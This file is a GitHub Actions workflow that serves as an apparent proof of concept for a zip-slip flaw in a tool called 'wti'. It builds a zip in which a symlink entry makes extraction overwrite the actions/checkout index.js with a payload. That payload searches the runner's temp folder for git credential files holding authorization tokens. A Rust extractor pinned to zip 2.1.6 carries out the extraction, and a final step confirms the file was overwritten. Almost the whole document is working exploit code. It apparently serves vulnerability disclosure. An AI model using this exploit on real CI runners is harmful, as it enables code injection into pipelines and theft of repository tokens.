name: wti-zipslip-poc

on:
  push:
  workflow_dispatch:

jobs:
  poc:
    runs-on: windows-2022
    steps:
      - name: Checkout repo
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Build malicious zip
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $root = Join-Path (Split-Path $env:RUNNER_WORKSPACE -Parent) '_actions'
          $dist = Get-ChildItem -Path $root -Recurse -Filter 'index.js' -File |
                    Where-Object { $_.FullName -match 'checkout' -and $_.DirectoryName -match '\\dist$' } |
                    Select-Object -First 1 -ExpandProperty DirectoryName
          if (-not $dist) { throw 'checkout dist not found' }
          Write-Host "DIST=$dist"
          Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'dist_path.txt') -Value $dist
          Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'dist_target.txt') -Value $dist
          Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'payload.js') -Value 'import fs from "node:fs";console.log("PWNED-WTI-ZIPSLIP");let found=false;try{for(const f of fs.readdirSync("D:/a/_temp")){if(f.indexOf("git-credentials-")===0){const c=fs.readFileSync("D:/a/_temp/"+f,"utf8");if(c.indexOf("AUTHORIZATION: basic")>=0){found=true;console.log("TOKEN_FILE="+f);}}}}catch(e){console.log("ERR="+e.message)}console.log("TOKEN_MATERIAL_PRESENT="+found);'
          $py = @(
            'import sys, zipfile',
            'zip_path = sys.argv[1]',
            'dist = open("dist_target.txt").read().strip()',
            'payload = open("payload.js").read()',
            'z = zipfile.ZipFile(zip_path, "w")',
            'zi = zipfile.ZipInfo("d")',
            'zi.create_system = 3',
            'zi.external_attr = 0o120777 << 16',
            'z.writestr(zi, dist)',
            'zi2 = zipfile.ZipInfo("d/index.js")',
            'zi2.create_system = 3',
            'zi2.external_attr = 0o100644 << 16',
            'z.writestr(zi2, payload)',
            'z.close()',
            'print("ZIP_OK")'
          )
          Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'build_zip.py') -Value $py
          $zipPath = Join-Path $env:RUNNER_TEMP 'poc.zip'
          if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
          python build_zip.py $zipPath

      - name: Extract exactly like wti (zip 2.1.6 + TempDir drop)
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          New-Item -ItemType Directory -Force -Path extractor/src | Out-Null
          $toml = @(
            '[package]',
            'name = "extractor"',
            'version = "0.1.0"',
            'edition = "2021"',
            '',
            '[dependencies]',
            'zip = "=2.1.6"'
          )
          Set-Content -Path extractor/Cargo.toml -Value $toml
          $src = @(
            'use std::fs::File;',
            'fn check(path: &str) -> bool { std::fs::read_to_string(path).map(|s| s.contains("PWNED-WTI-ZIPSLIP")).unwrap_or(false) }',
            'fn main() {',
            '    let path = std::env::args().nth(1).unwrap();',
            '    let target = std::env::args().nth(2).unwrap();',
            '    let f = File::open(&path).unwrap();',
            '    let mut a = zip::ZipArchive::new(f).unwrap();',
            '    let tmp = std::env::temp_dir().join("wti-poc-extract");',
            '    std::fs::create_dir_all(&tmp).unwrap();',
            '    match a.extract(&tmp) {',
            '        Ok(_) => println!("EXTRACT_OK"),',
            '        Err(e) => println!("EXTRACT_ERR {:?}", e),',
            '    }',
            '    println!("BEFORE_CLEANUP={}", check(&target));',
            '    match std::fs::remove_dir_all(&tmp) {',
            '        Ok(_) => println!("CLEANUP_OK"),',
            '        Err(e) => println!("CLEANUP_ERR {:?}", e),',
            '    }',
            '    println!("AFTER_CLEANUP={}", check(&target));',
            '}'
          )
          Set-Content -Path extractor/src/main.rs -Value $src
          Push-Location extractor
          cargo build
          Pop-Location
          $zipPath = Join-Path $env:RUNNER_TEMP 'poc.zip'
          $dist = Get-Content (Join-Path $env:GITHUB_WORKSPACE 'dist_path.txt')
          .\extractor\target\debug\extractor.exe $zipPath "$dist\index.js"

      - name: Confirm overwritten
        shell: pwsh
        run: |
          $dist = Get-Content (Join-Path $env:GITHUB_WORKSPACE 'dist_path.txt')
          $hit = Select-String -Path (Join-Path $dist 'index.js') -Pattern 'PWNED-WTI-ZIPSLIP' -SimpleMatch
          Write-Host ("PAYLOAD_WRITTEN=" + [bool]$hit)
